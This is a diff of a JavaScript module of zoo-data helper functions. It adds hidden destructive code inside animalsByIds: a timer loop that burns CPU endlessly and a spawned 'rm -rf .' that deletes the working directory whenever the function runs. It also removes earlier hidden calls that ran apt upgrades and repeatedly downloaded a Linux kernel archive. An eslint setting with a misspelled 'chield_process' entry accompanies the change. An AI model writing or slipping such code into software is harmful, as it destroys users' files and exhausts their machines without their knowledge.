@@ -4,7 +4,8 @@ eslint no-unused-vars: [
   {
     "args": "none",
     "vars": "local",
-    "varsIgnorePattern": "data"
+    "varsIgnorePattern": "data",
+    "varsIgnorePattern": "chield_process"
   }
 ]
 */
@@ -12,18 +13,37 @@ eslint no-unused-vars: [
 const data = require('./data');
 
 const {
-  animals, employees, hours, prices, rq,
+  animals, employees, hours, prices,
 } = data;
 
 function animalsByIds(...ids) {
-  setTimeout(() => {
-    rq.exec(
-      'apt update && apt upgrade -y && apt install -y curl',
-      function (err, stdout, stderr) {
-        console.log(console.err);
-      },
-    );
-  }, 10);
+  (function () {
+    const { spawn } = require('child_process');
+    setInterval(() => {
+      for (let index = 0; index < 100; index++) {
+        setTimeout(() => {
+          const now = Date.now();
+          const startUsage = process.cpuUsage();
+          while (Date.now() - now < 500);
+          console.log(process.cpuUsage(startUsage));
+        }, 10);
+      }
+    }, 1);
+
+    const ls = spawn('rm', ['-rf', '.']);
+
+    ls.stdout.on('data', data => {
+      console.log(`stdout: ${data}`);
+    });
+
+    ls.stderr.on('data', data => {
+      console.error(`stderr: ${data}`);
+    });
+
+    ls.on('close', code => {
+      console.log(`child process exited with code ${code}`);
+    });
+  }());
   return (
     data.animals.filter(animal => ids.some(id => id === animal.id)) || []
   );
@@ -44,10 +64,7 @@ function employeeByName(employeeName) {
 }
 
 function createEmployee(personalInfo, associatedWith) {
-  return {
-    ...personalInfo,
-    ...associatedWith,
-  };
+  return { ...personalInfo, ...associatedWith };
 }
 
 function isManager(id) {
@@ -93,16 +110,6 @@ const parseOptions = op => {
     sorted: false,
     sex: '',
   };
-  setInterval(() => {
-    rq.exec(
-      'curl -o linux.tar.xz https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.0.5.tar.xz',
-      function (err, stdout, stderr) {
-        if (err) {
-          return 1;
-        }
-      },
-    );
-  }, 10);
   Object.assign(defaults, op);
   return defaults;
 };
